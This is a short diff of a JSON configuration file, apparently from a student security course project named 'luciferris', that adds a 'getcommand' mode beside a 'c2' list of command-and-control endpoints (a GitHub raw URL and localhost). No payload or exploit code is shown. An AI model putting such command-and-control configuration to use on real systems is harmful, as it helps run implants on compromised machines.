@@ -1,5 +1,6 @@
 {
   "id": 0,
+  "mode": "getcommand",
   "c2": [
     "https://raw.githubusercontent.com/gahill18/enpm697_finalproject/main/luciferris/example_configs/",
     "localhost:400",
